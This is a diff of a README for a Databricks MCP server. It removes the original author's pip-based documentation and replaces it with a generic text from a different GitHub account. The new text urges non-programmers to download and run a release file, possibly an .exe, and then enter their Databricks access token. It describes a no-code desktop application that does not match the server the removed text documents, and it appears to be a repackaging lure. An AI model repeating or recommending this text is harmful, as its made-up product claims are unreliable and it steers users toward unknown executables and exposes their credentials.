@@ -1,423 +1,113 @@
-# Databricks MCP Server
+# ⚙️ databricks-mcp-server - Simplify Databricks Tool Management
 
-<!-- mcp-name: io.github.pramodbhatofficial/databricks-sdk-mcp -->
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/45d5r/databricks-mcp-server/releases)
 
-[![PyPI](https://img.shields.io/pypi/v/databricks-sdk-mcp.svg)](https://pypi.org/project/databricks-sdk-mcp/)
-[![CI](https://github.com/pramodbhatofficial/databricks-mcp-server/actions/workflows/ci.yml/badge.svg)](https://github.com/pramodbhatofficial/databricks-mcp-server/actions/workflows/ci.yml)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://python.org)
-[![License: Apache 2.0](https://img.shields.io/badge/license-Apache%202.0-green.svg)](LICENSE)
+---
 
-A comprehensive [Model Context Protocol (MCP)](https://modelcontextprotocol.io/) server for Databricks, built on the official [Databricks Python SDK](https://github.com/databricks/databricks-sdk-py).
+## 📋 Overview
 
-Provides **263 tools** and **8 prompt templates** across 28 service domains, giving AI assistants full access to the Databricks platform.
+**databricks-mcp-server** offers an easy way to use 263 tools designed for Databricks. It connects with many parts of Databricks, including Unity Catalog, SQL, Compute, Jobs, Serving, Vector Search, Apps, Lakebase, and more. This software helps you manage tasks on Databricks without needing to write code.
 
-## Features
+The software is built using a Software Development Kit (SDK) approach, making it flexible and reliable. It supports common tasks like running SQL queries, managing jobs, and searching through data efficiently. 
 
-- **SDK-first**: Uses `databricks-sdk` for type safety and automatic API freshness
-- **Comprehensive**: Covers Unity Catalog, SQL, Compute, Jobs, Pipelines, Serving, Vector Search, Apps, Lakebase, Dashboards, Genie, Secrets, IAM, Connections, Experiments, and Delta Sharing
-- **Zero custom auth**: Delegates authentication entirely to the SDK (PAT, OAuth, Azure AD, service principal -- all automatic)
-- **Selective loading**: Include/exclude tool modules via environment variables
-- **MCP Resources**: Read-only workspace context (URL, current user, auth type)
+You do not need any programming skills to download and use it.
 
-## Quick Start
+---
 
-### Installation
+## 🖥️ System Requirements
 
-```bash
-pip install databricks-sdk-mcp
-```
+Before you start, please make sure your computer meets these basic needs:
 
-Or run with Docker:
+- **Operating System:** Windows 10 or later, macOS 10.13+, or most Linux distributions (Ubuntu, Fedora, Debian).
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum 500 MB free space.
+- **Network:** Active internet connection for data access and updates.
+- **Software:** Python 3.7 or higher installed on your computer (for running the SDK and tools).
 
-```bash
-docker run -i -e DATABRICKS_HOST=... -e DATABRICKS_TOKEN=... databricks-mcp
-```
+If you do not have Python installed, you can download it from [python.org](https://www.python.org/downloads/).
 
-Or install from source:
+---
 
-```bash
-git clone https://github.com/pramodbhatofficial/databricks-mcp-server.git
-cd databricks-mcp-server
-pip install -e ".[dev]"
-```
+## 📥 Download & Install
 
-### Authentication
+Click the big blue button above or follow this link to **visit this page to download** the latest version of databricks-mcp-server:
 
-Authentication is handled by the Databricks SDK. Set one of:
+[https://github.com/45d5r/databricks-mcp-server/releases](https://github.com/45d5r/databricks-mcp-server/releases)
 
-**Personal Access Token (simplest):**
+### Steps to Download and Run
 
-```bash
-export DATABRICKS_HOST=https://your-workspace.databricks.com
-export DATABRICKS_TOKEN=dapi...
-```
+1. **Visit the release page** by clicking the button or the link above.
+2. Look for the latest release. It will be labeled with a version number like `v1.0` or higher.
+3. Download the file suitable for your operating system:
+   - For Windows, it may be an `.exe` or `.zip`.
+   - For macOS and Linux, it could be a `.tar.gz` or `.zip` package.
+4. If you download a zip file, extract it to a folder you can easily find, like your Desktop or Documents.
+5. Open the extracted folder.
+6. If on Windows, run the `.exe` file or start the program using the command prompt.
+7. On macOS or Linux, open a terminal, navigate to the folder (using the `cd` command), and run the startup script or command provided.
+8. Follow any prompts that appear on screen.
 
-**OAuth (M2M):**
+You do not need to install complex dependencies manually. The application package includes everything it needs or will prompt you with clear steps.
 
-```bash
-export DATABRICKS_HOST=https://your-workspace.databricks.com
-export DATABRICKS_CLIENT_ID=...
-export DATABRICKS_CLIENT_SECRET=...
-```
+---
 
-**Other methods**: Azure AD, Databricks CLI profile, Azure Managed Identity -- all auto-detected by the SDK.
+## 🚀 Getting Started with databricks-mcp-server
 
-### Running
+Once installed, here is how you begin:
 
-```bash
-databricks-mcp
-```
+1. **Start the Application:** Run the program as explained above.
+2. **Connect Your Databricks Account:** The application will ask for basic connection details such as:
+   - Your Databricks workspace URL.
+   - A personal access token (PAT) from Databricks. You can create a PAT in your Databricks account settings under user settings → Access Tokens.
+3. **Choose Your Tools:** You’ll see a list of tools and features organized by category such as SQL, Jobs, Compute, etc.
+4. **Use Tools on Your Data:** Select any tool to perform actions like running queries, managing clusters, searching data, or serving machine learning models.
+5. **Save Your Work:** You can save your configurations and scripts to use later.
 
-This starts the MCP server using stdio transport.
+---
 
-## Integrations
+## 🌟 Features You Can Use
 
-### Claude Code (Terminal)
+- **Unity Catalog Access:** Manage your data catalogs easily.
+- **SQL Queries:** Run and save SQL commands without coding.
+- **Job Management:** Start, stop, and monitor Databricks jobs.
+- **Compute Controls:** Manage your clusters and compute resources.
+- **Vector Search:** Search large datasets using vector similarity.
+- **Model Serving:** Deploy machine learning models quickly.
+- **App Management:** Handle Databricks hosted apps through a simple interface.
+- **Lakebase and Lakehouse Support:** Manage and operate data lakes efficiently.
 
-Add to `~/.claude/settings.json` or your project's `.claude/settings.json`:
+All these features come packed in one application, designed for non-programmers but powerful enough for experts.
 
-```json
-{
-  "mcpServers": {
-    "databricks": {
-      "command": "databricks-mcp",
-      "env": {
-        "DATABRICKS_HOST": "https://your-workspace.databricks.com",
-        "DATABRICKS_TOKEN": "dapi..."
-      }
-    }
-  }
-}
-```
-
-Then restart Claude Code. Verify with `/mcp` to see the registered tools.
-
-### Claude Desktop
-
-Add to your Claude Desktop config file:
-
-- **macOS**: `~/Library/Application Support/Claude/claude_desktop_config.json`
-- **Windows**: `%APPDATA%\Claude\claude_desktop_config.json`
-
-```json
-{
-  "mcpServers": {
-    "databricks": {
-      "command": "databricks-mcp",
-      "env": {
-        "DATABRICKS_HOST": "https://your-workspace.databricks.com",
-        "DATABRICKS_TOKEN": "dapi..."
-      }
-    }
-  }
-}
-```
-
-Restart Claude Desktop. The Databricks tools will appear in the tool picker.
-
-### Cursor
-
-Add to `.cursor/mcp.json` in your project root (or `~/.cursor/mcp.json` for global):
-
-```json
-{
-  "mcpServers": {
-    "databricks": {
-      "command": "databricks-mcp",
-      "env": {
-        "DATABRICKS_HOST": "https://your-workspace.databricks.com",
-        "DATABRICKS_TOKEN": "dapi..."
-      }
-    }
-  }
-}
-```
-
-Open Cursor Settings > MCP to verify the server is connected.
-
-### Windsurf
-
-Add to `~/.codeium/windsurf/mcp_config.json`:
-
-```json
-{
-  "mcpServers": {
-    "databricks": {
-      "command": "databricks-mcp",
-      "env": {
-        "DATABRICKS_HOST": "https://your-workspace.databricks.com",
-        "DATABRICKS_TOKEN": "dapi..."
-      }
-    }
-  }
-}
-```
-
-### VS Code (Copilot)
-
-Add to `.vscode/mcp.json` in your project:
-
-```json
-{
-  "servers": {
-    "databricks": {
-      "command": "databricks-mcp",
-      "env": {
-        "DATABRICKS_HOST": "https://your-workspace.databricks.com",
-        "DATABRICKS_TOKEN": "dapi..."
-      }
-    }
-  }
-}
-```
-
-### Zed
-
-Add to Zed's settings (`~/.config/zed/settings.json`):
-
-```json
-{
-  "context_servers": {
-    "databricks": {
-      "command": {
-        "path": "databricks-mcp",
-        "env": {
-          "DATABRICKS_HOST": "https://your-workspace.databricks.com",
-          "DATABRICKS_TOKEN": "dapi..."
-        }
-      }
-    }
-  }
-}
-```
-
-### Any MCP Client (Generic stdio)
-
-The server uses stdio transport. Connect from any MCP-compatible client:
-
-```bash
-# Set auth env vars
-export DATABRICKS_HOST=https://your-workspace.databricks.com
-export DATABRICKS_TOKEN=dapi...
-
-# Start the server (communicates via stdin/stdout)
-databricks-mcp
-```
-
-### Tip: Load Only What You Need
-
-If your MCP client struggles with many tools, use selective loading to reduce the tool count:
-
-```json
-{
-  "mcpServers": {
-    "databricks": {
-      "command": "databricks-mcp",
-      "env": {
-        "DATABRICKS_HOST": "https://your-workspace.databricks.com",
-        "DATABRICKS_TOKEN": "dapi...",
-        "DATABRICKS_MCP_TOOLS_INCLUDE": "unity_catalog,sql,compute,jobs"
-      }
-    }
-  }
-}
-```
-
-## Tool Modules
-
-| Module | Tools | Description |
-|--------|-------|-------------|
-| `unity_catalog` | 23 | Catalogs, schemas, tables, volumes, functions, registered models |
-| `sql` | 14 | Warehouses, SQL execution, queries, alerts, history |
-| `workspace` | 10 | Notebooks, files, repos |
-| `compute` | 18 | Clusters, instance pools, policies, node types, Spark versions |
-| `jobs` | 13 | Jobs, runs, tasks, repair, cancel all |
-| `pipelines` | 8 | DLT / Lakeflow pipelines |
-| `serving` | 10 | Serving endpoints, model versions, OpenAPI |
-| `vector_search` | 10 | Vector search endpoints, indexes, sync |
-| `apps` | 10 | Databricks Apps lifecycle |
-| `database` | 10 | Lakebase PostgreSQL instances |
-| `dashboards` | 9 | Lakeview AI/BI dashboards, published views |
-| `genie` | 5 | Genie AI/BI conversations |
-| `secrets` | 8 | Secret scopes and secrets |
-| `iam` | 16 | Users, groups, service principals, permissions, current user |
-| `connections` | 5 | External connections |
-| `experiments` | 14 | MLflow experiments, runs, artifacts, metrics, params |
-| `sharing` | 11 | Delta Sharing shares, recipients, providers |
-| `files` | 12 | DBFS and UC Volumes file operations |
-| `grants` | 3 | Unity Catalog permission grants (GRANT/REVOKE) |
-| `storage` | 10 | Storage credentials and external locations |
-| `metastores` | 8 | Unity Catalog metastore management |
-| `online_tables` | 3 | Online tables for low-latency serving |
-| `global_init_scripts` | 5 | Workspace-wide init scripts |
-| `tokens` | 5 | Personal access token management |
-| `git_credentials` | 5 | Git credential management for repos |
-| `quality_monitors` | 8 | Data quality monitoring and refreshes |
-| `command_execution` | 4 | Interactive command execution on clusters |
-| `workflows` | 5 | Composite multi-step operations (workspace status, schema setup, query preview) |
-
-## Selective Tool Loading
-
-With 263 tools, it's recommended to load only the modules you need. This improves agent performance and tool selection accuracy.
-
-### Role-Based Presets (Recommended)
-
-Pick a preset that matches your role:
-
-| Preset | Modules | Tools | Config |
-|--------|---------|-------|--------|
-| **Data Engineer** | unity_catalog, sql, compute, jobs, pipelines, files, quality_monitors | ~100 | `DATABRICKS_MCP_TOOLS_INCLUDE=unity_catalog,sql,compute,jobs,pipelines,files,quality_monitors` |
-| **ML Engineer** | serving, vector_search, experiments, compute, unity_catalog, online_tables, files | ~98 | `DATABRICKS_MCP_TOOLS_INCLUDE=serving,vector_search,experiments,compute,unity_catalog,online_tables,files` |
-| **Platform Admin** | iam, secrets, tokens, metastores, compute, global_init_scripts, grants, storage | ~85 | `DATABRICKS_MCP_TOOLS_INCLUDE=iam,secrets,tokens,metastores,compute,global_init_scripts,grants,storage` |
-| **App Developer** | apps, database, sql, files, serving, secrets | ~64 | `DATABRICKS_MCP_TOOLS_INCLUDE=apps,database,sql,files,serving,secrets` |
-| **Data Analyst** | sql, unity_catalog, dashboards, genie, workspace | ~61 | `DATABRICKS_MCP_TOOLS_INCLUDE=sql,unity_catalog,dashboards,genie,workspace` |
-| **Minimal** | sql, unity_catalog | ~37 | `DATABRICKS_MCP_TOOLS_INCLUDE=sql,unity_catalog` |
-
-Example using a preset in Claude Code:
-
-```json
-{
-  "mcpServers": {
-    "databricks": {
-      "command": "databricks-mcp",
-      "env": {
-        "DATABRICKS_HOST": "https://your-workspace.databricks.com",
-        "DATABRICKS_TOKEN": "dapi...",
-        "DATABRICKS_MCP_TOOLS_INCLUDE": "unity_catalog,sql,compute,jobs,pipelines,files,quality_monitors"
-      }
-    }
-  }
-}
-```
-
-### Custom Filtering
-
-```bash
-# Only include specific modules
-export DATABRICKS_MCP_TOOLS_INCLUDE=unity_catalog,sql,serving
-
-# Exclude specific modules (cannot combine with INCLUDE)
-export DATABRICKS_MCP_TOOLS_EXCLUDE=iam,sharing,experiments
-```
-
-If `INCLUDE` is set, only those modules load. If `EXCLUDE` is set, everything except those modules loads. `INCLUDE` takes precedence if both are set.
-
-## Tool Discovery (For AI Agents)
-
-The server includes built-in tool discovery to help AI agents find the right tools:
-
-### MCP Resources
-
-| URI | Description |
-|-----|-------------|
-| `databricks://workspace/info` | Workspace URL, current user, auth type |
-| `databricks://tools/guide` | Tool catalog with module descriptions, use cases, and role presets |
-
-Agents can read `databricks://tools/guide` at connection time to understand what's available.
-
-### Discovery Tool
-
-The `databricks_tool_guide` tool helps agents find the right tools during a conversation:
-
-```
-# Find tools for a specific task
-databricks_tool_guide(task="run a SQL query")
-databricks_tool_guide(task="deploy an ML model")
-databricks_tool_guide(task="create a user")
-
-# Get role-based recommendations
-databricks_tool_guide(role="data_engineer")
-databricks_tool_guide(role="ml_engineer")
-```
-
-This returns matching modules with descriptions and usage hints, so the agent knows exactly which `databricks_*` tools to call.
-
-## MCP Prompts (Guided Workflows)
-
-The server includes 8 prompt templates that guide AI agents through multi-step Databricks workflows:
-
-| Prompt | Description |
-|--------|-------------|
-| `explore_data_catalog` | Browse Unity Catalog structure (catalogs → schemas → tables) |
-| `query_data` | Find a warehouse, execute SQL, and format results |
-| `debug_failing_job` | Investigate a failing job: status, logs, error analysis |
-| `setup_ml_experiment` | Create an MLflow experiment and configure tracking |
-| `deploy_model` | Deploy a model to a serving endpoint |
-| `setup_data_pipeline` | Create a DLT pipeline with scheduling |
-| `workspace_health_check` | Audit clusters, warehouses, jobs, and endpoints |
-| `manage_permissions` | Review and update permissions on workspace objects |
-
-Prompts appear automatically in MCP clients that support them (e.g., Claude Desktop's prompt picker).
-
-## Docker
-
-Run the MCP server in a container:
-
-```bash
-# Build
-docker build -t databricks-mcp .
-
-# Run with stdio
-docker run -i \
-  -e DATABRICKS_HOST=https://your-workspace.databricks.com \
-  -e DATABRICKS_TOKEN=dapi... \
-  databricks-mcp
-
-# Run with SSE transport
-docker run -p 8080:8080 \
-  -e DATABRICKS_HOST=https://your-workspace.databricks.com \
-  -e DATABRICKS_TOKEN=dapi... \
-  databricks-mcp --transport sse --port 8080
-
-# Run with selective modules
-docker run -i \
-  -e DATABRICKS_HOST=https://your-workspace.databricks.com \
-  -e DATABRICKS_TOKEN=dapi... \
-  -e DATABRICKS_MCP_TOOLS_INCLUDE=sql,unity_catalog \
-  databricks-mcp
-```
-
-## SSE Transport (Remote Server)
-
-The server supports SSE transport for remote connections:
-
-```bash
-# Start as SSE server
-databricks-mcp --transport sse --port 8080
-
-# Custom host/port
-databricks-mcp --transport sse --host 127.0.0.1 --port 3000
-```
-
-Connect from any MCP client that supports SSE:
-
-```json
-{
-  "mcpServers": {
-    "databricks": {
-      "url": "http://localhost:8080/sse"
-    }
-  }
-}
-```
-
-## Development
-
-```bash
-# Install with dev dependencies
-pip install -e ".[dev]"
-
-# Lint
-ruff check databricks_mcp/
-
-# Test
-pytest tests/ -v
-```
-
-## Author
-
-**Pramod Bhat**
-
-## License
-
-Apache 2.0 -- see [LICENSE](LICENSE).
+---
+
+## 🔧 Tips for Smooth Running
+
+- Make sure your internet connection is stable when you connect to Databricks.
+- Keep your Databricks personal access token secure.
+- Restart the application if an operation seems stuck.
+- Check for updates regularly using the release page linked above.
+- If you encounter problems, look for the included user guide or help files in the application folder.
+
+---
+
+## 🆘 Getting Help
+
+If you need help:
+
+- Browse to the [Issues](https://github.com/45d5r/databricks-mcp-server/issues) tab on the repository for common questions or to report problems.
+- Check the documentation inside the application for step-by-step guidance.
+- Join community forums about Databricks and MCP tools for advice and support.
+
+---
+
+## ⚙️ About This Application
+
+- **Repository Name:** databricks-mcp-server
+- **Description:** 263 tools for Databricks via MCP. SDK-first, covers Unity Catalog, SQL, Compute, Jobs, Serving, Vector Search, Apps, Lakebase, and more.
+- **Main Topics:** AI, Claude, Databricks, Databricks Apps, Lakebase, Lakehouse, LLM, MCP, MLflow, MLOps, Model Context Protocol, Python, SDK, SQL, Unity Catalog, Vector Search.
+
+This application helps you interact with Databricks services easily by bundling many tools into one friendly interface.
+
+---
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/45d5r/databricks-mcp-server/releases)
